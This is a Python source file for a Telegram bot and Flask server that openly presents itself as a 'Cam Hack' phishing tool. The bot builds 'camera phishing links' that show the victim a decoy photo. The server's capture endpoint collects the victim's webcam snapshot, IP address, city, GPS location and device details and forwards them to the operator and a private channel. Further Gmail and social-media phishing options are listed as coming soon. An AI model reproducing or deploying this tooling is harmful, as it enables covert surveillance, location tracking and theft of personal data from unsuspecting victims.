import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import uuid
import time
import threading
import requests
import json
from flask import Flask, request, jsonify
from config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL

# ========== BOT ==========
bot = telebot.TeleBot(BOT_TOKEN)

# In-memory storage
user_data = {}
link_cache = {}
victim_data_store = {}

# ========== BOTTOM BUTTONS ==========
def get_bottom_buttons():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton("📸 Cam Hack"),
        KeyboardButton("📱 Social Media"),
        KeyboardButton("📧 Gmail"),
        KeyboardButton("🎮 Free Fire"),
        KeyboardButton("🔗 All Links")
    )
    return markup

# ========== BOT COMMANDS ==========
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    bot.send_message(
        user_id,
        "🔥 *Choose your weapon:*\n\n📸 Cam Hack (working)",
        reply_markup=get_bottom_buttons(),
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: True)
def route_buttons(message):
    text = message.text
    user_id = message.chat.id

    if text == "📸 Cam Hack":
        msg = bot.send_message(
            user_id,
            "📤 Send me a PHOTO (will be shown to victim)",
            reply_markup=get_bottom_buttons()
        )
        bot.register_next_step_handler(msg, get_cam_photo, user_id)

    elif text in ["📱 Social Media", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
        bot.send_message(
            user_id,
            f"⏳ *{text}* coming soon. Only *Cam Hack* works.",
            reply_markup=get_bottom_buttons(),
            parse_mode="Markdown"
        )
    else:
        bot.send_message(user_id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())

# ========== CAM HACK: PHOTO ==========
def get_cam_photo(message, user_id):
    if message.photo:
        photo_id = message.photo[-1].file_id
        file_info = bot.get_file(photo_id)
        photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["photo_url"] = photo_url
        
        # Store in server's memory
        victim_data_store[f"photo_{user_id}"] = photo_url
        
        bot.send_message(
            user_id,
            "📤 Now send REDIRECT LINK (URL where victim goes after capture)",
            reply_markup=get_bottom_buttons()
        )
        bot.register_next_step_handler(message, get_cam_redirect, user_id)
    else:
        bot.send_message(user_id, "❌ Send a PHOTO first.", reply_markup=get_bottom_buttons())

# ========== CAM HACK: REDIRECT ==========
def get_cam_redirect(message, user_id):
    redirect_url = message.text
    if redirect_url.startswith("http"):
        user_data[user_id]["redirect"] = redirect_url
        
        # Store in server's memory
        victim_data_store[f"redirect_{user_id}"] = redirect_url
        
        unique_id = str(uuid.uuid4())[:8]
        link = f"{BASE_URL}/p/{unique_id}?type=cam&v={user_id}"
        
        # Store link in cache
        link_cache[unique_id] = {"user_id": user_id, "time": time.time()}
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data="copy"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/")
        )
        bot.send_message(
            user_id,
            f"✅ *CAMERA phishing link ready:*\n\n`{link}`\n\nVictim sees your photo → redirects to `{redirect_url}`",
            reply_markup=markup,
            parse_mode="Markdown"
        )
    else:
        bot.send_message(user_id, "❌ Valid URL starting with http:// or https://", reply_markup=get_bottom_buttons())
        bot.register_next_step_handler(message, get_cam_redirect, user_id)

@bot.callback_query_handler(func=lambda call: True)
def handle_inline(call):
    if call.data == "copy":
        bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")

# ========== FORWARD DATA TO USER + CHANNEL ==========
def forward_to_user_and_channel(victim_id, data):
    try:
        # Find which user this victim belongs to
        user_id = None
        for uid, info in user_data.items():
            if str(uid) == str(victim_id) or f"photo_{uid}" in victim_data_store:
                user_id = uid
                break
        
        if not user_id:
            # Try to get from link_cache
            for key, val in link_cache.items():
                if str(val["user_id"]) == str(victim_id):
                    user_id = val["user_id"]
                    break
        
        if not user_id:
            print(f"⚠️ No user found for victim {victim_id}")
            return
        
        # --- Send to USER ---
        user_text = f"📥 *Victim Data Received*\n🆔 ID: {victim_id}\n"
        device = data.get('device_info', {})
        if device:
            user_text += f"📱 Device: {device.get('userAgent', 'N/A')[:50]}...\n"
            user_text += f"🔋 Battery: {device.get('battery', 'N/A')}\n📶 Network: {device.get('network', 'N/A')}\n"
        user_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
        
        bot.send_message(user_id, user_text, parse_mode="Markdown")

        # Send photo to user
        photo_data = data.get('photo')
        if photo_data and photo_data.startswith('data:image'):
            import base64, os
            try:
                photo_base64 = photo_data.split(',')[1]
                with open('temp.jpg', 'wb') as f:
                    f.write(base64.b64decode(photo_base64))
                with open('temp.jpg', 'rb') as f:
                    bot.send_photo(user_id, f)
                os.remove('temp.jpg')
            except Exception as e:
                print(f"Photo send error: {e}")

        # Send location to user
        loc = data.get('location')
        if loc and loc.get('lat') and loc.get('lng'):
            bot.send_location(user_id, loc['lat'], loc['lng'])

        # --- Send to PRIVATE CHANNEL ---
        channel_text = f"📥 *New Victim Data*\n🆔 ID: {victim_id}\n"
        if device:
            channel_text += f"📱 Device: {device.get('userAgent', 'N/A')[:50]}...\n"
            channel_text += f"🔋 Battery: {device.get('battery', 'N/A')}\n📶 Network: {device.get('network', 'N/A')}\n"
        channel_text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"

        bot.send_message(PRIVATE_CHANNEL_ID, channel_text, parse_mode="Markdown")

        if photo_data and photo_data.startswith('data:image'):
            import base64, os
            try:
                photo_base64 = photo_data.split(',')[1]
                with open('temp2.jpg', 'wb') as f:
                    f.write(base64.b64decode(photo_base64))
                with open('temp2.jpg', 'rb') as f:
                    bot.send_photo(PRIVATE_CHANNEL_ID, f)
                os.remove('temp2.jpg')
            except Exception as e:
                print(f"Channel photo error: {e}")

        if loc and loc.get('lat') and loc.get('lng'):
            bot.send_location(PRIVATE_CHANNEL_ID, loc['lat'], loc['lng'])

    except Exception as e:
        print(f"Forward error: {e}")

# ========== FLASK SERVER (FOR PHISHING PAGES) ==========
app = Flask(__name__)

@app.route('/p/<uid>')
def phishing_page(uid):
    victim_id = request.args.get('v', 'unknown')
    target_type = request.args.get('type', 'cam')
    
    # Get redirect URL from stored data
    redirect_url = victim_data_store.get(f"redirect_{victim_id}", 'https://google.com')
    photo_url = victim_data_store.get(f"photo_{victim_id}", 'https://via.placeholder.com/600x450/1a1a2e/ffffff?text=No+Photo')
    
    with open('web/index.html', 'r') as f:
        html = f.read()
    
    html = html.replace('{{REDIRECT_URL}}', redirect_url)
    html = html.replace('{{VICTIM_ID}}', victim_id)
    html = html.replace('{{TYPE}}', target_type)
    html = html.replace('{{PHOTO_URL}}', photo_url)
    return html

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    victim_id = data.get('victim_id')
    if not victim_id:
        return jsonify({"status": "error"}), 400
    
    # Store victim data
    victim_data_store[f"victim_{victim_id}"] = data
    
    # Forward to bot (which forwards to user + channel)
    threading.Thread(target=forward_to_user_and_channel, args=(victim_id, data)).start()
    
    return jsonify({"status": "ok"})

@app.route('/')
def home():
    return "✅ Bot is running!"

# ========== CLEANUP THREAD ==========
def clean_old_data():
    while True:
        time.sleep(600)
        now = time.time()
        to_del = []
        for key in link_cache:
            if now - link_cache[key]["time"] > 600:
                to_del.append(key)
        for key in to_del:
            del link_cache[key]
        print(f"🧹 Deleted {len(to_del)} old links")

threading.Thread(target=clean_old_data, daemon=True).start()

# ========== RUN BOTH BOT AND FLASK ==========
if __name__ == "__main__":
    print("🤖 Cam Hack is working...")
    
    # Run bot in a separate thread
    def run_bot():
        while True:
            try:
                bot.infinity_polling(timeout=60)
            except Exception as e:
                print(f"Bot error: {e}")
                time.sleep(5)
    
    threading.Thread(target=run_bot, daemon=True).start()
    
    # Run Flask server (this blocks)
    app.run(host='0.0.0.0', port=5000, debug=False)
